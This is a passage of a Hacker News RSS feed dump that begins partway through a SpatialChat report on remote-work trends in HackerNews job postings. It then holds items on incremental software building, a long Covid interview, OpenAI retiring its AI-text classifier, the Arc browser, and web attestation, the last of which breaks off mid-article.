outperformed the onsite positions, and the trend remained strong until thees days.</p><div><p>There was no single month where number of onsite position was greater than remote.</p></div><figure><img src="https://blog.spatial.chat/content/images/2023/07/image-5.png" alt="" loading="lazy" width="2000" height="638" srcset="https://blog.spatial.chat/content/images/size/w600/2023/07/image-5.png 600w, https://blog.spatial.chat/content/images/size/w1000/2023/07/image-5.png 1000w, https://blog.spatial.chat/content/images/size/w1600/2023/07/image-5.png 1600w, https://blog.spatial.chat/content/images/size/w2400/2023/07/image-5.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Continuing the upward trend, in 2021, the percentage of remote work positions climbed to 79% of all job listings on HackerNews. This significant increase indicates a strong preference for remote work within the community.</p><figure><img src="https://blog.spatial.chat/content/images/2023/07/image-6.png" alt="" loading="lazy" width="2000" height="544" srcset="https://blog.spatial.chat/content/images/size/w600/2023/07/image-6.png 600w, https://blog.spatial.chat/content/images/size/w1000/2023/07/image-6.png 1000w, https://blog.spatial.chat/content/images/size/w1600/2023/07/image-6.png 1600w, https://blog.spatial.chat/content/images/size/w2400/2023/07/image-6.png 2400w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://blog.spatial.chat/content/images/2023/07/image-8.png" alt="" loading="lazy" width="2000" height="508" srcset="https://blog.spatial.chat/content/images/size/w600/2023/07/image-8.png 600w, https://blog.spatial.chat/content/images/size/w1000/2023/07/image-8.png 1000w, https://blog.spatial.chat/content/images/size/w1600/2023/07/image-8.png 1600w, https://blog.spatial.chat/content/images/size/w2400/2023/07/image-8.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Despite experiencing a significant drop in the number of job openings, nearly halving year-over-year since June 2022, the community's preference for remote work has remained relatively unaffected.</p><figure><img src="https://blog.spatial.chat/content/images/2023/07/image-11.png" alt="" loading="lazy" width="2000" height="635" srcset="https://blog.spatial.chat/content/images/size/w600/2023/07/image-11.png 600w, https://blog.spatial.chat/content/images/size/w1000/2023/07/image-11.png 1000w, https://blog.spatial.chat/content/images/size/w1600/2023/07/image-11.png 1600w, https://blog.spatial.chat/content/images/size/w2400/2023/07/image-11.png 2400w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://blog.spatial.chat/content/images/2023/07/image-10.png" alt="" loading="lazy" width="2000" height="538" srcset="https://blog.spatial.chat/content/images/size/w600/2023/07/image-10.png 600w, https://blog.spatial.chat/content/images/size/w1000/2023/07/image-10.png 1000w, https://blog.spatial.chat/content/images/size/w1600/2023/07/image-10.png 1600w, https://blog.spatial.chat/content/images/size/w2400/2023/07/image-10.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>As of 2023, up to June, the percentage of remote work positions remained high at 69% of all job listings. However the data presents a slight decline in the percentage of remote work positions within the HackerNews community. On average, only 70% of job postings were remote, marking a decrease compared to previous years. The trend reached its lowest point in May, with remote work positions comprising just 57% of job listings.</p><p>In addition to remote work preferences, another crucial aspect of the job market within the HackerNews community is the prevalence of location-specific or citizenship requirements. </p><h2 id="location-restricted-remote-work-trends">Location-Restricted Remote Work Trends</h2><p>While remote work offers the flexibility to work from anywhere, certain positions and industries may still necessitate candidates to be based in specific locations or possess specific citizenship qualifications. Understanding the dynamics of these requirements is essential for professionals seeking job opportunities and employers looking to attract suitable candidates.</p><figure><img src="https://blog.spatial.chat/content/images/2023/07/image-12.png" alt="" loading="lazy" width="2000" height="534" srcset="https://blog.spatial.chat/content/images/size/w600/2023/07/image-12.png 600w, https://blog.spatial.chat/content/images/size/w1000/2023/07/image-12.png 1000w, https://blog.spatial.chat/content/images/size/w1600/2023/07/image-12.png 1600w, https://blog.spatial.chat/content/images/size/w2400/2023/07/image-12.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>The percentage of job descriptions with location-specific or citizenship requirements within the HackerNews community has steadily increased from 16% in 2018 to 37% in 2023 (up to June). This trend highlights a growing emphasis on hiring individuals who can be physically present in specific locations or possess the required citizenship, indicating a sustained demand for candidates with specific geographical qualifications.</p><p>The increase in job descriptions with location-specific or citizenship requirements within the HackerNews community can be attributed to several factors. Firstly, it is likely driven by companies adhering to legal obligations, especially those with government contracts or restrictions on hiring non-residential full-time employees due to jurisdictional limitations. Additionally, concerns about preserving company culture may prompt organizations to prioritize candidates who can be physically present in a specific location or possess specific citizenship, ensuring a cohesive organizational environment.</p><p>It is worth noting that the initial adopters of remote work were likely companies that had the ability to hire globally, as the supply of remote workers was relatively limited at that time. These companies recognized the benefits of accessing a larger talent pool and offering remote work options, which allowed them to attract skilled professionals from different parts of the world.</p><p>Unsurprisingly, the majority of location requirements correspond to the United States, followed by Canada and the European Union (EU). </p><p>Indeed, the migration trend away from expensive cities is not limited to specific regions but has been observed across the United States.As the concept of work becomes increasingly decoupled from traditional office spaces, individuals are finding the freedom to reside in locations farther away from urban centers or explore new regions. Even prior to the COVID-19 pandemic, remote work had already facilitated a notable <a href="https://www.nytimes.com/interactive/2023/06/17/upshot/17migration-patterns-movers.html?ref=drorpoleg.com">migration of employees away from the most expensive cities</a>:</p><div><p>In the years 2018 and 2019, approximately 40,000 remote workers relocated from the New York metropolitan area, while 20,000 departed from San Francisco.</p></div><p>While some may eventually return, a significant majority of these individuals are expected to establish permanent residences in their new locations. </p><h2 id="which-programming-languages-are-popular-for-remote-work">Which programming languages are popular for remote work?</h2><p>At the end we'd love to analyse the remote preferences of the programming language requirements in job positions:</p><ol><li>React, Python, and Java are the most frequently mentioned programming languages in job postings within the HackerNews community, with high total job counts for each language.</li><li>The programming languages with the highest percentage of remote jobs out of all jobs that require the language / skills are TypeScript (70%), Postgres (61%), GraphQL (62%), and React (60%). These languages have a higher proportion of remote work opportunities compared to others. Python, JavaScript, Go, Ruby, and Node.js also have many remote jobs available.</li><li>Java and C++, have a relatively lower percentage of remote jobs, ranging from 45% to 58%. Professionals specializing in these languages may find more on-site or location-specific employment opportunities within the HackerNews community.</li></ol><p>Exploring the relationship between compensation and remote work, as well as delving into specific industries, adds further depth to understanding the dynamics of remote work but that requeres a more carefull data gatherings. Very few positions openly share the compensation ranges and mapping the industry requires intense human touch</p><p>Indeed, exploring the relationship between compensation and remote work, as well as analyzing specific industries, can provide valuable insights into the dynamics of remote work. The availability of detailed compensation information for remote positions is often limited, as companies may not openly disclose salary ranges in job postings. </p><h2 id="conclusion">Conclusion</h2><p>Based on the analysis of the data provided, it is evident that remote work has gained significant popularity within the HackerNews community, particularly in the field of computer science and entrepreneurship. The number of job postings for remote positions has shown a consistent increase over the years, with a substantial surge observed in 2021. This suggests that remote work has become an attractive option for both employers and job seekers at least within the community.</p><p>The COVID-19 pandemic is likely a contributing factor to the increased preference for remote work, as it accelerated the adoption of remote work practices globally. However, it is important to note that even before the pandemic, remote work was already being considered by a considerable number of employers within the HackerNews community.</p><p>If you're the researcher and interested to play around the data, contact <strong>d@spatial.chat</strong> to request the dataset. We plan to open-source the dashboards and the dataset in the nearest future. Stay tuned!</p><hr><h3 id="disclaimers">Disclaimers:</h3><ul><li>The report, created by <a href="https://blog.spatial.chat/tracking-hackernews-shifting-preferences-for-remote-jobs-over-5-years/www.spatial.chat">SpatialChat</a>, the company that designs a <a href="https://www.spatial.chat/solutions/remote-work">virtual office product</a> specifically for remote teams. Therefore, we are particularly interested in the growing abundance of remote job opportunities.</li><li>This data highlights that a majority of job postings within the HackerNews community have specified locations within the United States, Canada, United Kingdom and Germany. Therefore, it is not possible to draw conclusions about global market trends.</li><li>Data primarily reflects the preferences and practices of tech companies, which are often at the forefront of work <a href="https://blog.spatial.chat/missing-piece-of-the-remote-work-tech-stack/">flexibility</a> In 2022, the U.S. had a working population of around 160 million people, of which <a href="https://www.drorpoleg.com/r/73195ef8?m=e2c105e7-a095-468e-a3c3-e26f55474bcd">less</a> than 5% worked in the tech industry.</li></ul>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Before you try to do something, make sure you can do nothing (224 pts)]]></title>
            <link>https://devblogs.microsoft.com/oldnewthing/20230725-00/?p=108482</link>
            <guid>36863094</guid>
            <pubDate>Tue, 25 Jul 2023 14:49:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://devblogs.microsoft.com/oldnewthing/20230725-00/?p=108482">https://devblogs.microsoft.com/oldnewthing/20230725-00/?p=108482</a>, See on <a href="https://news.ycombinator.com/item?id=36863094">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="featured">
                         <p>
            July 25th, 2023</p><!-- .entry-meta -->
        <p>When building a new thing, a good first step is to build a thing that <i>does nothing</i>. That way, you at least know you are starting from a good place. If I‚Äôm building a component that performs an action, I‚Äôll probably do it in these steps:</p>
<ul>
<li>Step zero is to write a standalone program to perform the action. This ensures that the action is even possible.</li>
<li>Once I have working code to perform the action, I write a component that <i>doesn‚Äôt</i> perform an action. That at least makes sure I know how to build a component.</li>
<li>Next, I register the component for the action, but have the <code>Invoke</code> method merely print the message ‚ÄúYay!‚Äù to the debugger without doing anything else. This makes sure I know how to get the component to run at the proper time.</li>
<li>Next, I fill in the <code>Invoke</code> method with enough code to identify what action to perform and which object to perform it on, print that information to the debugger, and return without actually performing the action. This makes sure I can identify which action is supposed to be done.</li>
<li>Finally, I fill in the rest of the <code>Invoke</code> method to perform the action on the desired object. For this, I can copy/paste the already-debugged code from step zero.</li>
</ul>
<p>Too often, I see relatively inexperienced developers dive in and start writing a big complex thing: Then they can‚Äôt even get it to compile because it‚Äôs so big and complex. They ask for help, saying, ‚ÄúI‚Äôm having trouble with this one line of code,‚Äù but as you study what they have written, you realize that this one line of code is hardly the problem. The program hasn‚Äôt even gotten to the point where it can comprehend the possibility of executing that line of code. I mutter to myself, ‚ÄúHow did you let it get this bad?‚Äù</p>
<p>Start with something that does nothing. Make sure you can do nothing successfully. Only then should you start making changes so it starts doing something. That way, you know that any problems you have are related to your attempts to do something.</p>

        

		
        
	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The burden of Long Covid ‚Äúso large as to be unfathomable‚Äù (116 pts)]]></title>
            <link>https://www.rnz.co.nz/national/programmes/saturday/audio/2018899512/prof-danny-altmann-the-burden-of-long-covid</link>
            <guid>36862855</guid>
            <pubDate>Tue, 25 Jul 2023 14:34:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.rnz.co.nz/national/programmes/saturday/audio/2018899512/prof-danny-altmann-the-burden-of-long-covid">https://www.rnz.co.nz/national/programmes/saturday/audio/2018899512/prof-danny-altmann-the-burden-of-long-covid</a>, See on <a href="https://news.ycombinator.com/item?id=36862855">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="description">
      <div itemscope="" itemtype="http://schema.org/ImageObject">
<p><img loading="lazy" src="https://rnz-ressh.cloudinary.com/image/upload/s--T8dThMkl--/ar_16:10,c_fill,f_auto,g_auto,q_auto,w_1050/v1647392235/4LW6EF9_image_crop_138443" width="1050" height="700" alt="asian young man with face mask stay isolation at home for self quarantine due to an epidemic of COVID-19 and he looks out by windows. Home isolation. Isolating. Isolation. MIQ. Quaranatine"></p><p>
<span itemprop="caption">Much is still being learned about long Covid.&nbsp; </span>
<span>Photo: <span itemprop="copyrightHolder">123RF</span></span>
</p>
</div>
<p>A scientific review of the world's research into long Covid&nbsp;carried out by a team of leading UK researchers has led&nbsp;them to declare the burden of the post-infection condition&nbsp;"so large as to be unfathomable".&nbsp;</p>
<p>Immunologist and researcher from London's Imperial College&nbsp;professor Danny Altmann, who led the review team, talked with <em>Saturday Morning</em>'s Kim Hill about the&nbsp;findings and the implications of the disease on people's lives and on the larger scale.&nbsp;</p>
<p>The <a href="https://www.nature.com/articles/s41577-023-00904-7">review was published in <em>Nature</em></a>, and said that if <a href="https://www.rnz.co.nz/national/programmes/checkpoint/audio/2018836174/long-covid-experts-warn-against-exercising-too-soon-after-virus">10 percent of acute infections</a> lead to persistent symptoms&nbsp;(as earlier studies have concluded could be the case), up to 400 million people could be in need of support for long Covid worldwide. &nbsp;</p>


<p>While the <a href="https://www.rnz.co.nz/national/programmes/checkpoint/audio/2018875235/long-covid-up-to-300k-nzers-may-have-post-viral-illness">Australian government has allocated $50m for long Covid research</a>,&nbsp;in New Zealand&nbsp;there has been zero investment for bio-medical long Covid research to understand and treat the condition.</p>
<p>Symptoms of long Covid range from the profoundly disabling to 'merely' upsetting. Those with long Covid frequently display a core set of symptoms, Altmann says, including breathlessness, fatigue, wheeze, post-exertional malaise and brain fog.&nbsp;</p>
<div itemscope="" itemtype="http://schema.org/ImageObject">
<p><img loading="lazy" src="https://rnz-ressh.cloudinary.com/image/upload/s--emiZ96U9--/ar_1:1,c_fill,f_auto,g_auto,q_auto,w_288/v1689904433/4L5IQQB_Danny_Altmann_copyright_medical_research_foundation_jpg" width="288" height="205" alt="Professor Danny Altmann"></p><p>
<span itemprop="caption">Professor Danny Altmann </span>
<span>Photo: <span itemprop="copyrightHolder">supplied</span></span>
</p>
</div>
<p>But about 200 other symptoms are also associated with the disease, and can come and go, including word-finding difficulties, insomnia, skin rashes and new allergies.&nbsp;</p>
<p>Research has found signs of damage in long Covid patients' hearts, lungs, brains and nervous systems, and signs of disease in their immune systems.</p>
<p>Scientific reviews take a big picture in-depth look at the diverse research and studies that have already been carried out on a topic - in this case long Covid - to give an authoritative collective overviews of findings from the medical and scientific community.</p>
<p>"My job in writing that review was to try and stand back from it and take a really long hard look at the hard data and the hard evidence and the hard numbers and try and put together a kind of consensus that I thought would be useful to build a core agenda moving forward, that would be useful to people," Altmann says.&nbsp;</p>
<p>He is also the coauthor of a book that came out last year called the <em>Long Covid Handbook.&nbsp;</em></p>
<h4><strong>Comparing before and after</strong></h4>
<p>Altmann explains how one study drawn on in the review was able to capture 'before' workups of people who later displayed brain and nervous system damage after being affected by long Covid, as the researchers used data already collected on people taking part in a large longitudinal cohort study, the UK Biobank study - some of who had later gone on to develop long Covid.</p>
<p>Extensive MRIs, medical exams and cognitive tests were done on this group over the years, so 'before and after' data could be compared.&nbsp;</p>
<p>"That's where some of the most scary answers come from," Altmann says, "because some parts of their brain had shrunk as a consequence of the Covid, and their scores on cognitive tests had also come down as a consequence of the Covid.</p>
<p>"So I'm sorry to be so scary - but that's how we know."</p>
<p>His team created a 'hypothesis table' of the current theories about how long Covid affects patients' bodies.</p>
<p>Some leading ideas being studied include autoimmune disease (when the body's immune system attacks the body's own proteins), inflammation, blood clotting abnormalities, organ damage, viral persistence (where a reservoir of the virus remains in the body), blood clotting abnormalities, and difficulty with gas exchange and oxygenating the blood.</p>
<p>More than one disease mechanism can be true, Altmann says: "They don't have to be mutually exclusive".</p>
<p>In one theory scientists believe the virus could remain insidiously in many of the tissues in the body, particularly those tissues that have that have the <a href="https://theconversation.com/what-is-the-ace2-receptor-how-is-it-connected-to-coronavirus-and-why-might-it-be-key-to-treating-covid-19-the-experts-explain-136928">ACE2 receptor which the virus latches on to</a>.&nbsp;</p>
<p>"So it can get into the heart and the lungs and the liver, and the olfactory lobe - the part of the brain to do with smelling and tasting, and it can do damage there - the type of thing you'd be able to see on an MRI.</p>
<p>"And I think that's part of the answer, but not the whole answer," Altmann says.</p>
<h4><strong>Post-exertion malaise&nbsp;</strong></h4>
<p>One significant symptom of long Covid, known as PEM or 'post-exertional malaise' was the sometimes incapacitating exhaustion experienced by sufferers after even a small amount of exercise such as standing for a sound check, which could leave them as worn out as if they'd just run a marathon.&nbsp;</p>
<p>PEM can require a surprising amount of time to recover from after just a small amount of physical effort, Altmann says, describing a friend who frequently had to take himself away to a quiet place to rest to recover before doing anything more.</p>
<p>And it is difficult for people who have not experienced the disease or mixed closely with those who had&nbsp;to "appreciate the scale of the thing they're talking about".</p>
<p>In casual social conversations about long Covid, he found many people who were not familiar with the disease flippantly compared it to not feeling as young as you once did, or finding a challenge like riding a bike more difficult than you might have when you were fitter. But that was missing the enormity of the effects to many sufferers, Altmann's findings showed.&nbsp;</p>
<p>"We're talking about previously young fit healthy people who do exert themselves for five or ten minutes doing something... and have to kind of rest up for the rest of the weekend because they're absolutely shattered - they feel like they've run a marathon."&nbsp;</p>
<p>"And there's some studies around suggesting that that's to do with impaired gas exchange, impaired oxygen uptake across the lungs. But this is a real thing - people are absolutely shattered," he says.&nbsp;</p>
<div itemscope="" itemtype="http://schema.org/ImageObject">
<p><img loading="lazy" src="https://rnz-ressh.cloudinary.com/image/upload/s--M7aCyHWJ--/ar_16:10,c_fill,f_auto,g_auto,q_auto,w_1050/v1647406364/4LVT0Q9_copyright_image_287634" width="1050" height="700" alt="No caption"></p><p>
<span itemprop="caption">Vaccinations have made a difference, Altmann says.&nbsp; </span>
<span>Photo: <span itemprop="copyrightHolder">123rf</span></span>
</p>
</div>
<p>The research showed Covid-19 vaccinations are effective and important in reducing the chances of getting long Covid.&nbsp;</p>
<p>"The vaccinations have been amazing and miraculous, and have worked terribly well and got the planet out of a terrible fix. Otherwise who knows where we'd be now in terms of our mortality and our misery and our economies - they've worked very well, Altmann says.</p>
<p>"The best way to not get<em> long</em> Covid is to not get Covid, and the best way to not get Covid is to be well vaccinated and boosted and have a good level of antibodies to stop the virus getting in.</p>
<p>"And yet we know perfectly well that there were many people who were vaccinated who did get breakthrough infections and some of those have gone on to get long Covid, but we know that in those breakthrough cases in the vaccinated people, your chance of long Covid is further reduced perhaps by another 50 percent.</p>
<p>"So it doesn't get you off the hook completely, but it certainly helps your odds."</p>
<h4>
<strong>Few choices for patients with condition</strong>&nbsp;</h4>
<p>Asked if he ever contracted long Covid how he would he treat himself, Altmann says the choices currently facing patients are sparse.</p>
<p>"I think it speaks to how many long Covid sufferers there are, and how absolutely desperate they are and how impatient they have become, that medicine is being kind of served out on social media platforms ... and people are doing some quite scary things.</p>
<p>"What I would be doing now is going to see my doctor and being quite a difficult, demanding patient," he says.</p>
<p>A challenging climate of misconceptions about long Covid&nbsp;meant the researchers themselves had even encountered scientists suggesting long Covid was not a worthy cause to be studied. &nbsp;</p>
<p>But, Altmann said education is the answer. &nbsp;</p>
<p>"If your doctor isn't helpful change doctors, educate them, take in the papers to show them.</p>
<p>"We certainly are in a very difficult and desperate situation at the moment where - I certainly feel it, that a lot of long Covid patients around the world feel that there's almost a kind of conspiracy in the medical profession of people who know the treatments and are for some reason withholding the treatments.</p>
<p>"The answer is, we've done an awful lot of work but we don't really know even the full list of which drugs we'd put into a clinical trial tomorrow, given the chance. So we just need a little bit more work and a little bit more time - which isn't a very satisfying or pleasing answer."</p>
<p>More work is desperately needed on the wider topic of viral persistence in medicine, he says. In the case of long Covid, this is the idea that 'reservoirs' of the coronavirus might remain in the body after the acute phase of the disease, and cause ongoing disease.</p>
<p>The theory is Altmann's favourite as it potentially offers low-hanging fruit: "Because if you think about it, in terms of potential treatments ...if we were really good at identifying the people who have got a problem because they can't clear the virus and have a persistent reservoir, surely we could just come in with the appropriate antivirals or the appropriate monoclonal antibodies and make them better."</p>
<p>However, the challenge there lies in identifying the people who might have a viral reservoir affecting them.&nbsp;</p>
<p>The gold standard to test for viruses lurking in the body is with a gut biopsy, but "it wouldn't be ethical to go around taking out bits of people's guts to have a look," Altmann says. So new ways to test this would need to be worked out.</p>
<div itemscope="" itemtype="http://schema.org/ImageObject">
<p><img loading="lazy" src="https://rnz-ressh.cloudinary.com/image/upload/s--CAlI3qRt--/ar_16:10,c_fill,f_auto,g_auto,q_auto,w_1050/v1655407926/4LQ24EI_nurse_jpg" width="1050" height="694" alt="medicine, healthcare and pandemic concept - sad young female doctor or nurse wearing face protective mask for protection from virus disease sitting on floor at hospital"></p><p>
<span itemprop="caption">Chronic fatigue syndrome has been compared to long Covid.&nbsp; </span>
<span>Photo: <span itemprop="copyrightHolder">123RF</span></span>
</p>
</div>
<h4><strong>Links to chronic fatigue considered</strong></h4>
<p>Another disease&nbsp;<a href="https://www.rnz.co.nz/news/what-you-need-to-know/456714/is-long-covid-a-new-type-of-chronic-fatigue-syndrome">noted for similarities</a>&nbsp;with long Covid is ME/CFS - myalgic encephalomyelitis, also known as chronic fatigue syndrome.&nbsp;</p>
<p>"They are terribly similar. And it's really helpful and illuminating to join up those discussions," Altmann says.&nbsp;</p>
<p>"Almost every time I go on TV or radio I get a certain amount of comment from people in the ME/CFS community, really quite angry with me, and saying 'well you've jumped on the bandwagon now, but where have you been the last 20 years? Nobody's heard us, nobody's listened to us, nobody's researched on us'.</p>
<p>"My answer is - firstly an apology on the part of the medical community, because yeah, nobody was prepared to fund that research, nobody was that interested, nobody had the wherewithall to look at it with it.</p>
<p>"And, now I think we're at a kind of Rosetta Stone moment where understanding one can illuminate the other in a bi-directional way, because so many things that were discussed over the years in ME/CFS are almost certainly relevant for long Covid and vice versa."</p>
<p>The two diseases have many similar physical signs and reported symptoms, including post-exertional malaise (PEM).</p>
<p>"Some of the blood biomarkers that we talk about are the same in both of them, some of the gut microbiome changes that we talk about are the same in both of them, and the symptom list is massively overlapping," Altmann says.&nbsp;</p>
<p>A diagnostic test would be a good first step, and several groups are carrying out research around finding one.&nbsp;</p>
<p>"We're working really really hard on that, and so are some other groups. That would help in so many ways, both for recognition for those patients, for proper coding of their patients in their electronic healthcare records and access to the correct clinical care pathways, it also means that if we can count them and code them then we can make proper healthcare budgeting provision and all of the things that we've been talking about.</p>
<p>"If we stop dismissing it as 'self-reported' and it's test-reported then we can actually get them into clinical trials and actually test out some of our ideas."&nbsp;</p>
<p>Some similarities have been drawn between long Covid and multiple sclerosis (MS), another disease with a specific pattern of fatigue associated with it.</p>
<p>As an immunologist, Altmann says his specialty area is autoimmunity, which is central to understanding the disease process at work in MS. &nbsp;</p>
<p>But in long Covid, "We and other people have tried hard to understand how big a part that plays in long Covid, and for the moment it's still complex," he says.&nbsp;</p>
<p>"When we and other people look at the blood of people with long Covid we find lots of different autoimmune patterns in terms of the auto-antibodies that they have in their blood."</p>
<p>However, the research is still not clear enough to say "confidently" how those markers relate to the symptoms of long Covid - "what those [autoimmune patterns] are doing in the disease".&nbsp;</p>
<p>"Long Covid is really enormous and causing real global misery, and there are some big underlying themes in terms of what we think the mechanisms are.&nbsp;</p>
<p>"There are so many schools of thought out there."&nbsp;</p>
<div itemscope="" itemtype="http://schema.org/ImageObject">
<p><img loading="lazy" src="https://rnz-ressh.cloudinary.com/image/upload/s--U6bwV2oF--/ar_16:10,c_fill,f_auto,g_auto,q_auto,w_1050/v1651721415/4LT37T9_copyright_image_291803" width="1050" height="664" alt="Medical laboratory assistant holding positive COVID-19 rapid test."></p><p>
<span itemprop="caption">While the pandemic has receded, the impacts of long Covid are still uncertain.&nbsp; </span>
<span>Photo: <span itemprop="copyrightHolder">123RF</span></span>
</p>
</div>
<h4>
<strong>Not everyone affected the same</strong>&nbsp;</h4>
<p>Different patients experience different symptoms from a diverse set of symptoms associated with long Covid, which could mean potential treatments might only relate to a particular sub-group and "one drug or antiviral treatment might be asking too much".</p>
<p>"Some people may be helped by antivirals and some by anti-coagulation treatment, and some by specific auto-immune suppression.&nbsp;</p>
<p>"You can imagine if we take all of those different people and stick them in the same pot and try and treat them the same we might never disentangle the answers at all and might not help them very well, so we need to do it carefully and logically."</p>
<p>People can develop long Covid after even the mildest of Covid infections, they can develop long Covid after being infected with any of the different strains of the Covid-19 virus, and long Covid can first develop in people after they experience a re-infection with Covid, Altmann says. &nbsp;</p>
<p>After <a href="https://www.rnz.co.nz/programmes/the-detail/story/2018804693/political-moves-pushing-the-path-of-covid-19">'Freedom Day' in the UK in 2021</a>, when many measures to control the spread of Covid were relaxed, the number of people with long Covid still continued to climb significantly, Altmann says.</p>
<p>"We went almost straight into the Omicron wave and then the Omicron subvariants, and in a population with a so-called mild variant circulating and a population who was double or triple vaccinated we have acquired an extra 700,000 people into our long Covid burden just from that period ... it's added massively to our long Covid burden at a time when we weren't even counting or caring, which sounds very cruel to me."</p>
<p>It is still too early in our collective experience of long Covid to know if people who get it will recover. So far the research shows that "some things for some people get better, and yet a lot of it is very stubbornly the same and doesn't get better very fast," Altmann says.</p>
<p>However, there is one potential crystal ball to give us some insight.&nbsp;</p>
<p>Because of similarities between the virus that causes Covid-19 and the SARS-CoV-1 virus - the disease that caused SARS outbreaks in 2003 and 2004 - as part of his research, Altmann talked with consultants who had treated SARS patients earlier, to find about their long-term outcomes.&nbsp;</p>
<p>One wrote up and presented their findings: "It was one of the most devastating things I'd read on the subject," Altmann says.</p>
<p>"I think it ended with the words: 'In conclusion, none of my patients ever fully recovered, most of them never went back to full time employment, many of them never got their old jobs back.'</p>
<p>"So to me it doesn't sound like a thing that goes away fast."</p>
<p>Some long Covid patients feel they have been treated as collateral in the unfolding of the Covid-19 pandemic, and have been forgotten about.</p>
<p>"You don't want to go around in a permanent state of outrage, do you? But yes, I do feel outraged for them," Altmann says.</p>
<p>As a result of what his team discovered in their research, he says they now had a strong drive to help pursue the problem, and not just out of academic interest: "This is really about a race to the finish line to get some drugs into clinical trials that could actually make some people better.</p>
<p>"As immunologists we feel that we've got quite a good box of goodies to offer people. If you think of immunology and modern medicine, lots of things have benefited enormously from that kind of research - if you think about cancer immunotherapy or treatment for autoimmune diseases like arthritis or multiple sclerosis, that's all come from really super immunology research," he says.</p>
<p>"So we feel that if we could only nudge this stuff over the line we could maybe make a difference for people."</p>

    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenAI Quietly Shuts Down Its AI Detection Tool (402 pts)]]></title>
            <link>https://decrypt.co/149826/openai-quietly-shutters-its-ai-detection-tool</link>
            <guid>36862850</guid>
            <pubDate>Tue, 25 Jul 2023 14:34:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://decrypt.co/149826/openai-quietly-shutters-its-ai-detection-tool">https://decrypt.co/149826/openai-quietly-shutters-its-ai-detection-tool</a>, See on <a href="https://news.ycombinator.com/item?id=36862850">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>In January, artificial intelligence powerhouse OpenAI announced a tool that could save the world‚Äîor at least preserve the sanity of professors and teachers‚Äîby detecting whether a piece of content had been created using generative AI tools like its own ChatGPT.</p><p>Half a year later, that tool is dead, killed because it couldn‚Äôt do what it was designed to do.</p><p>ChatGPT creator OpenAI quietly unplugged its AI detection tool, AI Classifier, last week because of ‚Äúits low rate of accuracy,‚Äù the firm said. The explanation was not in a new announcement, but added in a note added to the <a href="https://openai.com/blog/new-ai-classifier-for-indicating-ai-written-text" target="_blank" rel="noopener nofollow external">blog post</a> that first announced the tool. The link to OpenAI's classifier is no longer available.</p><p>"We are working to incorporate feedback and are currently researching more effective provenance techniques for text, and have made a commitment to develop and deploy mechanisms that enable users to understand if audio or visual content is AI-generated," OpenAI wrote.</p><p>New tools allowing the use of increasingly sophisticated AI come online almost daily and have created a cottage industry of AI detectors.</p><p>OpenAI announced the launch of its AI Classifier claiming it could distinguish between text written by a human and an AI. Even then, however, OpenAI called the classifier "not fully reliable," adding that the evaluations on a ‚Äúchallenge set‚Äù of English texts correctly identified 26% of AI-written text as ‚Äúlikely AI-written,‚Äù while incorrectly labeling the human-written text as AI-written 9% of the time.</p><p>OpenAI said limitations of the AI Classifier include being unreliable on text with fewer than 1,000 characters, incorrectly labeling text written by humans as written by AI, and classifiers based on neural networks performing poorly outside of their training data.</p><p>One sector that is acutely interested in accurately detecting AI is education. Since the launch of ChatGPT in November, educators have sounded the alarm of students using the chatbot to write <a href="https://www.nytimes.com/2023/01/16/technology/chatgpt-artificial-intelligence-universities.html" target="_blank">essays</a>.</p><p>"We recognize that identifying AI-written text has been an important point of discussion among educators, and equally important is recognizing the limits and impacts of AI generated text classifiers in the classroom," OpenAI said, adding that the company will continue to broaden outreach as it learns.</p><p>OpenAI has not yet responded to <i>Decrypt's</i> request for comment.</p><div><h3>Stay on top of crypto news, get daily updates in your inbox.</h3></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Arc Browser 1.0 (145 pts)]]></title>
            <link>https://arc.net/</link>
            <guid>36862546</guid>
            <pubDate>Tue, 25 Jul 2023 14:14:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arc.net/">https://arc.net/</a>, See on <a href="https://news.ycombinator.com/item?id=36862546">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><section><p>A browser that doesn‚Äôt just meet your <span></span> needs ‚Äî it anticipates them.</p><p>Clean and calm, Arc shapes itself to how you use the internet.</p></section><section><p>Space for the different sides of you.</p><div><p>Effortlessly organize everything you do online ‚Äî work, study, hobbies ‚Äî all in one window with</p><!-- --> <p><strong>Spaces</strong>.</p></div></section><section><p>Your browser, your way.</p><p>Find your perfect setup with <strong>Split Screen</strong>, <strong>Themes</strong>, and more.</p></section><section><p>The comfort of privacy.</p><div><p>Arc is built from the ground up to be private and secure. We don‚Äôt <span></span> know what sites you visit or what you search for.</p><div><p><a href="https://thebrowser.company/privacy/">Learn more about privacy in Arc ‚Üí</a></p></div></div></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple already shipped attestation on the web, and we barely noticed (488 pts)]]></title>
            <link>https://httptoolkit.com/blog/apple-private-access-tokens-attestation/</link>
            <guid>36862494</guid>
            <pubDate>Tue, 25 Jul 2023 14:10:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://httptoolkit.com/blog/apple-private-access-tokens-attestation/">https://httptoolkit.com/blog/apple-private-access-tokens-attestation/</a>, See on <a href="https://news.ycombinator.com/item?id=36862494">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>There's been a lot of concern recently about the <a href="https://github.com/RupertBenWiser/Web-Environment-Integrity">Web Environment Integrity</a> proposal, developed by a selection of authors from Google, and apparently being prototyped in Chromium.</p>
<p>There's good reason for anger here (though I'm not sure yelling at people on GitHub is necessarily the best outlet). This proposal amounts to attestation on the web, limiting access to features or entire sites based on whether the client is approved by a trusted issuer. In practice, that will mean Apple, Microsoft &amp; Google.</p>
